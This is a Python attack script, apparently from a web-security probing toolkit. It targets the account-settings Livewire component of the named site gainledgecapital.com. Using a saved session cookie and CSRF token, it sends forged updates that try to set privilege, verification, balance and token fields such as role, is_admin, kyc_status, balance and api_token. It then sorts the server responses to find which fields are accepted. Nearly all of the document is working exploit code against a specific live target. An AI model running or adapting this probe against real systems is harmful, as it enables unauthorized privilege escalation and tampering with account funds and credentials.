#!/usr/bin/env python3
"""
Probe top-level property mass assignment on user.account-settings.show.
The `user.*` dotted path is blocked by Livewire 3 ('Can't set model properties
directly'), so we focus on whether undeclared TOP-LEVEL props are accepted, and
whether the existing form properties persist via saveProfile / changePassword /
saveWithdrawalMethod without proper guards.
"""
import sys, os, time, json
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lw_send import fresh_component, lw_update

JAR = "cookies_a.txt"
PATH = "/user/account-settings"
COMP = "user.account-settings.show"
REFERER = "https://gainledgecapital.com" + PATH

# Top-level component-level props to attempt (no save call)
TOPLEVEL = [
    "role", "is_admin", "is_staff", "is_super_admin",
    "user_type", "type", "level", "tier",
    "permissions", "abilities",
    "verified", "kyc_status", "is_verified",
    "balance", "credits", "subscription_tier",
    "api_token", "remember_token",
    # Nested in a non-model property (does Livewire allow nested updates on a regular prop?)
    "userData.role", "data.role",
]

os.makedirs("findings/p1b_toplevel", exist_ok=True)
results = []
for prop in TOPLEVEL:
    csrf, raw, _ = fresh_component(JAR, PATH, COMP)
    code, _p, body = lw_update(JAR, raw,
        updates={prop: 1 if "is_" in prop or "verified" in prop or "balance" in prop else "X"},
        calls=[], csrf=csrf, referer=REFERER,
        save=f"findings/p1b_toplevel/{prop.replace('.','_')}.out")
    cls = "?"
    if code == 500:
        if "Property [$" in body or "not found on component" in body:
            cls = "PROP NOT FOUND"
        elif "doesn't exist on" in body:
            cls = "PROP NOT FOUND"
        elif "not authorized" in body.lower():
            cls = "DENIED"
        else:
            cls = "500-other"
    elif code == 200:
        cls = "200 OK (suspicious — exists?)"
    elif code == 419:
        cls = "419 CSRF"
    elif code == 403:
        cls = "403 forbidden"
    print(f"  {prop:24s}  HTTP {code}  {cls}")
    results.append({"prop": prop, "code": code, "class": cls})
    time.sleep(0.6)

with open("findings/p1b_toplevel/_summary.json", "w") as f:
    json.dump(results, f, indent=2)
print("Done.")
